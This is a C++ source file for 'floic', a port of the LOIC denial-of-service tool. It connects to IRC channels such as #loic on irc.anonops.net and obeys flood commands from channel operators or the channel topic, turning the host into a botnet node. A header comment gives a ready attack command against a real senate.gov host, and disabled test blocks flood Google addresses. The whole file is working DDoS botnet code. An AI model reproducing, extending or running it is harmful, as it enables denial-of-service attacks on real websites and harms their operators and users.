// user: ejsejs,
// glomex, RootDosPl0x
// !lazor default targethost=http://lieberman.senate.gov subsite=/ speed=3 threads=20 method=tcp wait=false random=true checked=false message=www.wikileaks.org port=80 start

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <vector>
#include <string>
#include <sstream>
#include <algorithm>
#include <iostream>
#include <iterator>
#include <time.h>

#include <libircclient/libircclient.h>

#include "httpflooder.h"
#include "xxpflooder.h"
#include "runner.h"
#include "util.h"
#include "defines.h"

Runner *run = NULL;

irc_session_t *session = NULL;
int botnum = 0;
int verbosity = 0;
int maxretry = 10;
bool bManual = false;

IFlooder *arFlooder = NULL;

// current selected server/channel
const char *server;
const char *channel;
int port = 6667;

// command line server/channel
char cli_channel[200];
char cli_server[200];
int cli_port = 0;

// bot name
char name[11];

// index server cycling
int cur_server = 0;

struct server_entry
{
	char *server;
	char *channel;
	int port;
};

int total_servers = 0;
server_entry *valid_servers;

const char *valid_channel[] =
{
	"#loic",
	"#floic",
	"#ciol",
	"#hoic",
	"#loicswe",

	NULL
};

void free_server_list()
{
	for (int i = 0; i < total_servers; i++)
	{
		free(valid_servers[i].server);
		valid_servers[i].server = NULL;

		free(valid_servers[i].channel);
		valid_servers[i].channel = NULL;
	}

	free(valid_servers);
	valid_servers = NULL;
}

int populate_server_list()
{
	FILE *fp = fopen("config.txt", "rt");
	fseek(fp, 0, SEEK_END);
	size_t size = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	if (!size)
	{
		fclose(fp);
		return 0;
	}

	char *buf = (char *)malloc(sizeof(char) * size + 1);
	fread(buf, size, 1, fp);
	fclose(fp);

	total_servers = 0;
	for (int i = 0; i < (int)size; i++)
		if (buf[i] == '\n')
			total_servers++;

	if (!total_servers)
		return 0;

	valid_servers = (server_entry *)malloc(sizeof(server_entry) * total_servers);

	char *line = buf;
	char *server = strtok(line, ":");
	for (int i = 0; i < total_servers; i++)
	{
		char *port = strtok(NULL, ":");
		char *chan = strtok(NULL, "\n");

		if (server && chan && port)
		{
			valid_servers[i].server = strdup(server);
			valid_servers[i].channel = strdup(chan);
			valid_servers[i].port = atoi(port);
		}
		else
		{
			ERROR("error: config.txt:%d: invalid line.\n", i);
		}

		server = strtok(NULL, ":");
	}

	if (verbosity > 2)
	{
		for (int i = 0; i < total_servers; i++)
		{
			fprintf(stdout, "added: %s:%d/%s\n", valid_servers[i].server, valid_servers[i].port, valid_servers[i].channel);
		}
	}

	return 1;
}

std::vector<std::string> names;
std::vector<std::string> opnames;

void collect_names()
{
	std::vector<std::string> nnames;
	std::vector<std::string> nopnames;

	botnum = 0;
	opnames.clear();
	names.clear();
	nopnames.swap(opnames);
	nnames.swap(names);
	irc_cmd_names(session, channel);
}

void on_finish_names()
{
	std::vector<std::string>::iterator it = names.begin();
	std::vector<std::string>::iterator end = names.end();

	for (; it != end; it++)
	{
		const char *name = (*it).c_str();
		char c = name[0];
		if (c == '@' || c == '&' || c == '~')
			opnames.push_back(&name[1]);
	}

	if (verbosity)
	{
		fprintf(stdout, "ops: %ld\n\t", opnames.size());
		it = opnames.begin();
		end = opnames.end();

		for (; it != end; it++)
		{
			fprintf(stdout, "%s ", (*it).c_str());
		}

		fprintf(stdout, "\n");
	}
}

void on_receive_names(const char *buffer)
{
	using namespace std;
	if (!botnum)
	{
		istringstream iss(buffer);
		vector<string> tokens;
		copy(istream_iterator<string>(iss), istream_iterator<string>(), back_inserter<vector<string> >(tokens));

		names.insert(names.end(), tokens.begin(), tokens.end());
	}
}

void on_command(const char *origin, const char *buffer, bool topic)
{
	char *finduser = strdup(origin);
	for (int i = 0; i < (int)strlen(finduser); i++)
	{
		if (finduser[i] == '!')
			finduser[i] = '\0';
	}

	char *user = strdup(finduser);
	free(finduser);

	std::string opname(user);
	std::vector<std::string>::iterator it = std::find(opnames.begin(), opnames.end(), opname);
	if (it != opnames.end() || topic)
	{
		LOG("accept command: %s\n", buffer);
		run->Execute(buffer);
	}
	else
	{
		ERROR("reject command: %s (from user '%s').\n", buffer, user);
	}

	free(user);
}

void dcc_send_req_callback(irc_session_t *session, const char *nick, const char *addr, const char *filename, unsigned long size, irc_dcc_t dccid)
{
}

void dcc_chat_req_callback(irc_session_t *session, const char *nick, const char *addr, irc_dcc_t dccid)
{
}

void numeric_callback(irc_session_t *session, unsigned int event, const char *origin, const char **params, unsigned int count)
{
	switch (event)
	{
		case LIBIRC_RFC_RPL_TOPIC:
		{
			on_command(origin, params[2], true);
		}
		break;

		case LIBIRC_RFC_RPL_NAMREPLY:
		{
			on_receive_names(params[3]);
		}
		break;

		case LIBIRC_RFC_RPL_ENDOFNAMES:
		{
			if (!botnum)
			{
				botnum = names.size();
				INFO("bots: %d\n", botnum);

				on_finish_names();
			}
		}
		break;

		case LIBIRC_RFC_RPL_WELCOME:
		case LIBIRC_RFC_RPL_YOURHOST:
		case LIBIRC_RFC_RPL_CREATED:
		case LIBIRC_RFC_RPL_MYINFO:
		case LIBIRC_RFC_RPL_BOUNCE:
		{
		}
		break;

		default:
		{
			}
		break;
	}

	if (verbosity > 2)
	{
		fprintf(stdout, "numeric event: %d origin: %s", event, origin);
		for (unsigned int i = 0; i < count; i++)
		{
			fprintf(stdout, " param%d: %s", i, params[i]);
		}
		fprintf(stdout, "\n");
	}
}

void generic_callback(irc_session_t *session, const char *event, const char *origin, const char **params, unsigned int count)
{
	if (strcmp(event, "ERROR") == 0 && verbosity)
	{
		ERROR("error: %s\n", params[0]);
	}

	if (strcmp(event, "PRIVMSG") == 0)
	{
		on_command(origin, params[1], false);
	}

	if (verbosity > 2)
	{
		fprintf(stdout, "event: %s origin: %s", event, origin);
		for (unsigned int i = 0; i < count; i++)
		{
			fprintf(stdout, " param%d: %s", i, params[i]);
		}
		fprintf(stdout, "\n");
	}
}

void command_callback(irc_session_t *session, const char *event, const char *origin, const char **params, unsigned int count)
{
	on_command(origin, params[1], (strcmp(event, "TOPIC") == 0));
	generic_callback(session, event, origin, params, count);
}

void user_callback(irc_session_t *session, const char *event, const char *origin, const char **params, unsigned int count)
{
	collect_names();
	generic_callback(session, event, origin, params, count);
}

void connect_callback(irc_session_t *session, const char *event, const char *origin, const char **params, unsigned int count)
{
	INFO("joining channel: %s.\n", channel);

	// try join cli channel
	if (irc_cmd_join(session, channel, NULL))
	{
		ERROR("error: %s.\n", irc_strerror(irc_errno(session)));
		INFO("info: trying other possible channels...\n");

		channel = valid_servers[cur_server].channel;
		if (irc_cmd_join(session, channel, NULL))
		{
			bool ok = false;
			for (int i = 0; valid_channel[i] != NULL; i++)
			{
				LOG("info: trying channel '%s'.\n", valid_channel[i]);

				channel = valid_channel[i];
				if (irc_cmd_join(session, channel, NULL))
					continue;
				else
					ok = true;
			}

			if (!ok)
			{
				ERROR("error: could not join channel - disconnecting.\n");

				irc_disconnect(session);
				//irc_destroy_session(session);
				return;
			}
		}
	}

	INFO("joined channel %s.\n", channel);

	collect_names();
	generic_callback(session, event, origin, params, count);
}

void hivemind()
{
	// create user name
	for (int i = 0; i < (int)sizeof(name); i++)
	{
		name[i] = get_random_valid_char();
	}
	memcpy(name, "LOIC_", strlen("LOIC_"));
	name[sizeof(name)] = '\0';

	LOG("using username: %s\n", name);

	int error = 0, retry = 0;
	unsigned int low = 0, high = 0;

	irc_get_version(&high, &low);
	if (high != 1 && low != 2)
	{
		fprintf(stderr, "error: wrong libircclient version: \n");
		fprintf(stderr, "\tcurrent: libircclient %d.%02d\n", high, low);
		fprintf(stderr, "\tneeded: libircclient 1.02\n");
		exit(EXIT_FAILURE);
	}

	irc_callbacks_t callbacks;
	callbacks.event_connect = &connect_callback;
	callbacks.event_nick = &user_callback;
	callbacks.event_quit = &generic_callback;
	callbacks.event_join = &user_callback;
	callbacks.event_part = &user_callback;
	callbacks.event_mode = &user_callback;
	callbacks.event_umode = &generic_callback;
	callbacks.event_topic = &command_callback;
	callbacks.event_kick = &generic_callback;
	callbacks.event_channel = &generic_callback;
	callbacks.event_privmsg = &command_callback;
	callbacks.event_notice = &generic_callback;
	callbacks.event_invite = &generic_callback;
	callbacks.event_ctcp_req = &generic_callback;
	callbacks.event_ctcp_rep = &generic_callback;
	callbacks.event_ctcp_action = &generic_callback;
	callbacks.event_unknown = &generic_callback;
	callbacks.event_numeric = &numeric_callback;
	callbacks.event_dcc_chat_req = &dcc_chat_req_callback;
	callbacks.event_dcc_send_req = &dcc_send_req_callback;

	session = irc_create_session(&callbacks);
	while (retry < maxretry)
	{
		if ((error = irc_connect(session, server, port, "", name, "IRCLOIC", "floic v1.0")))
		{
			ERROR("error: connecting to '%s:%d/%s' -> %s.\n", server, port, channel, irc_strerror(irc_errno(session)));
			cur_server++;
			if (!valid_servers[cur_server].server)
				cur_server = 0;

			server = valid_servers[cur_server].server;
			channel = valid_servers[cur_server].channel;
			port = valid_servers[cur_server].port;

			irc_destroy_session(session);
			session = irc_create_session(&callbacks);

			LOG("switching to the next server '%s:%d/%s'... wait!\n", server, port, channel);
			sleep(1);
			continue;
		}

		while (!irc_is_connected(session));

		INFO("connected.\n");

		irc_run(session);
		retry++;
	}

	INFO("max retries.\n");

	irc_destroy_session(session);
}

void help(char *appname)
{
	fprintf(stdout, "usage: %s <options>\n", appname);
	fprintf(stdout, "\t-s <server>\t\tdefault=irc.anonops.net\n");
	fprintf(stdout, "\t-p <port>\t\tdefault=6667\n");
	fprintf(stdout, "\t-c <channel>\t\tdefault=loic\n");
	fprintf(stdout, "\t-! \"lazor ...\" (manual mode, no hivemind will be used)\n");
	fprintf(stdout, "\t-v\t\t\tverbosity level (repeat this option up to 3 times to change level)\n");
	fprintf(stdout, "\t-h\t\t\tthis help\n\n");
}

int cli(int argc, char **argv)
{
	server = valid_servers[cur_server].server;
	channel = valid_servers[cur_server].channel;

	if (argc > 1)
	{
		for (int i = 0; i < argc; i++)
		{
			const char *param = argv[i];

			if (strcmp(param, "-h") == 0)
				return 0;

			if (strcmp(param, "-v") == 0)
				verbosity++;

			if (strcmp(param, "-c") == 0)
			{
				const char *c = argv[i + 1];
				if (!c)
					return 0;

				memset(cli_channel, '\0', sizeof(cli_channel));
				snprintf(cli_channel, 200, "#%s", c);
				channel = cli_channel;
			}

			if (strcmp(param, "-s") == 0)
			{
				const char *s = argv[i + 1];
				if (!s)
					return 0;

				memset(cli_server, '\0', sizeof(cli_server));
				snprintf(cli_server, 200, "%s", s);
				server = cli_server;
			}

			if (strcmp(param, "-p") == 0)
			{
				const char *p = argv[i + 1];
				if (!p)
					return 0;

				cli_port = atoi(p);
				if (!cli_port)
					cli_port = port;

				port = cli_port;
			}

			if (strcmp(param, "-!") == 0)
			{
				run->Execute(argv[i + 1]);
				bManual = true;
			}
		}
	}

	return 1;
}

int main(int argc, char **argv)
{
	srand(time(NULL));
	fprintf(stdout, "floic - fungos' low orbit ion cannon v1.0\n");

	if (!populate_server_list())
	{
		ERROR("error: config.txt not found or invalid.\n");
		return EXIT_FAILURE;
	}

	run = new Runner();

#if 0
	run->Execute("lazor default threads=2 targethost=www.google.com subsite=/ speed=3 method=tcp wait=false random=true message=Payback port=80 start");//argv[1]);
	sleep(50);
	fprintf(stdout, "exiting...\n");
	delete run;
	return 0;
#endif

#if 0
	IFlooder *flood[3];
	for (int i = 0; i < 3; i++)
	{
		//flood[i] = new HTTPFlooder(i, "64.233.163.104", 80, 2000, "http://www.google.com/", "/webhp?hl=en", false, true);
		flood[i] = new XXPFlooder(i, "64.233.163.104", 80, 0, 0, "GET /q=Guide to the Galaxy", false);
		//flood[i] = new XXPFlooder(i, "127.0.0.1", 80, 0, 1, "GET /q=Guide to the Galaxy", false);
		//flood[i]->Run();
	}

	while (1);
	return 0;
#endif

	if (!cli(argc, argv))
	{
		help(argv[0]);
		return EXIT_FAILURE;
	}

	if (!bManual)
		hivemind();
	else
		while(1); // manual mode exits with ctrl+c

	delete run;

	return EXIT_SUCCESS;
}
